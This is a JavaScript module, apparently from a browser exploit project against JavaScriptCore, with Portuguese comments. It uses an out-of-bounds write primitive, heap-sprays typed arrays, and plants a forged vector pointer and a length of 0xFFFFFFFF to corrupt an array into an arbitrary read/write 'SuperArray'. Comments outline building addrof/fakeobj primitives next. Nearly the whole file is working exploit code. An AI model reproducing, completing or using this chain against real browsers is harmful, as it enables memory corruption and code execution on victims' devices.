// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';

const FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR = "superArrayViaRelativeMVector_v20c";

const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB = 0x50; 
const TARGET_M_LENGTH_VALUE = 0xFFFFFFFF;

// Valor a ser plantado para o m_vector.
// Se oob_read_absolute usa o dataPointer do oob_array_buffer_real como base 0,
// então um m_vector de 0 faria o superArray ler do início dos dados do oob_array_buffer_real.
const PLANTED_M_VECTOR_VALUE = new AdvancedInt64(0, 0); // Tentar 0 para apontar para o início dos dados do oob_buffer

const NUM_SPRAY_OBJECTS = 500;
const ORIGINAL_SPRAY_LENGTH = 8;
const SPRAY_ELEMENT_VAL_A = 0xABABABAB;
const SPRAY_ELEMENT_VAL_B = 0xCDCDCDCD;

const MARKER_IN_OOB_BUFFER = 0xCAFEBEEF;
const MARKER_OFFSET_IN_OOB_BUFFER_DATA = 0x20; // Onde o marcador será escrito DENTRO dos dados do oob_array_buffer_real

let sprayedVictimObjects = [];

export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR}: SuperArray com m_vector relativo ---`, "test", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);

        // FASE 1: Spray
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
        sprayedVictimObjects = [];
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = SPRAY_ELEMENT_VAL_A ^ i;
            u32arr[1] = SPRAY_ELEMENT_VAL_B ^ i;
            sprayedVictimObjects.push(u32arr);
        }
        logS3("Pulverização concluída.", "good", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);

        // FASE 2: Plantar metadados no oob_array_buffer_real
        logS3(`FASE 2: Plantando m_vector=${PLANTED_M_VECTOR_VALUE.toString(true)}, m_length=${toHex(TARGET_M_LENGTH_VALUE)} em oob_buffer...`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
        const targetMetaVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const targetMetaLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        
        oob_write_absolute(targetMetaVectorOffset, PLANTED_M_VECTOR_VALUE, 8);
        oob_write_absolute(targetMetaLengthOffset, TARGET_M_LENGTH_VALUE, 4);
        logS3(`  Valores plantados em oob_buffer[${toHex(targetMetaVectorOffset)}] e oob_buffer[${toHex(targetMetaLengthOffset)}]`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
        // Verificar o que foi plantado
        const chk_vec = oob_read_absolute(targetMetaVectorOffset,8);
        const chk_len = oob_read_absolute(targetMetaLengthOffset,4);
        logS3(`  Verificação Pós-Plantio: m_vector=${chk_vec.toString(true)}, m_length=${toHex(chk_len)}`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);


        // FASE 3: Trigger
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
        await PAUSE_S3(200);

        // FASE 4: Identificar SuperArray
        logS3(`FASE 4: Tentando identificar SuperArray...`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
        // Escrever um marcador nos dados do oob_array_buffer_real usando a primitiva OOB
        oob_write_absolute(MARKER_OFFSET_IN_OOB_BUFFER_DATA, MARKER_IN_OOB_BUFFER, 4);
        logS3(`  Marcador ${toHex(MARKER_IN_OOB_BUFFER)} escrito em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_BUFFER_DATA)}] via oob_write.`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);

        let superArrayIndex = -1;
        let foundSuperArray = null;

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            const currentArray = sprayedVictimObjects[i];
            if (!currentArray) continue;

            // Primeiro, checar se o length foi corrompido para o valor massivo
            if (currentArray.length === TARGET_M_LENGTH_VALUE) {
                logS3(`    Array pulverizado [${i}] tem length = ${toHex(TARGET_M_LENGTH_VALUE)}. Verificando marcador...`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
                try {
                    // Se PLANTED_M_VECTOR_VALUE foi 0 (relativo ao dataPointer do oob_array_buffer_real),
                    // então o índice para ler o marcador é MARKER_OFFSET_IN_OOB_BUFFER_DATA / 4.
                    const index_to_read_marker = MARKER_OFFSET_IN_OOB_BUFFER_DATA / 4; // Uint32Array index
                    
                    if (index_to_read_marker < currentArray.length) { // Segurança adicional
                        const value_read = currentArray[index_to_read_marker];
                        logS3(`    Array [${i}][${toHex(index_to_read_marker)}] leu: ${toHex(value_read)}`, "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
                        if (value_read === MARKER_IN_OOB_BUFFER) {
                            superArrayIndex = i;
                            foundSuperArray = currentArray;
                            logS3(`    !!!! SUPERARRAY ENCONTRADO !!!! Índice: ${i}. Marcador verificado.`, "vuln", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
                            document.title = `SUPERARRAY Idx ${i}!`;
                            break; 
                        }
                    }
                } catch (e) {
                    logS3(`    Erro ao tentar ler marcador do array [${i}]: ${e.message}`, "warn", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
                }
            }
        }

        if (foundSuperArray) {
            logS3(`  SuperArray (índice ${superArrayIndex}) validado. Length: ${foundSuperArray.length}`, "good", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
            // AGORA PODEMOS USAR foundSuperArray PARA LER/ESCREVER NO oob_array_buffer_real
            // Exemplo: Ler o Structure* de um objeto colocado no oob_array_buffer_real
            // Esta é a base para addrof/fakeobj se tivermos o superArray mapeado para o oob_array_buffer_real
            const test_read_offset_in_oob_data = 0x0; // Ler o início dos dados do oob_buffer
            const test_read_idx = test_read_offset_in_oob_data / 4;
            const val_from_superarray = foundSuperArray[test_read_idx];
            logS3(`  Leitura de teste com SuperArray: SuperArray[${test_read_idx}] (oob_buffer[${toHex(test_read_offset_in_oob_data)}]) = ${toHex(val_from_superarray)}`, "leak", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
            // Se o SuperArray funciona, val_from_superarray deve ser o que está em oob_array_buffer_real[0]

            // TENTAR CONSTRUIR ADDROF
            // 1. Colocar um objeto alvo (targetFuncForLeak_v19b) "dentro" do oob_array_buffer_real
            //    (não diretamente, mas fazer o SuperArray ler/escrever seus metadados se pudermos
            //     fazer o SuperArray apontar para ele, ou copiar os metadados dele para o oob_buffer).
            //    Por agora, vamos assumir que o SuperArray nos dá R/W no oob_buffer.
            //    Podemos então usar o SuperArray para criar um ArrayBuffer falso DENTRO do oob_buffer,
            //    e fazer esse ArrayBuffer falso apontar para o targetFuncForLeak_v19b.
            logS3("  SuperArray obtido. Próximos passos seriam construir addrof/fakeobj usando esta primitiva R/W no oob_array_buffer_real.", "info", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);

        } else {
            logS3("  Nenhum SuperArray identificado que mapeie para o oob_array_buffer_real.", "warn", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
            document.title = "SuperArray NÃO Encontrado (v20c)";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR}: ${e.message}`, "critical", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
        document.title = `${FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR} Concluído ---`, "test", FNAME_SUPERARRAY_VIA_RELATIVE_MVECTOR);
    }
}
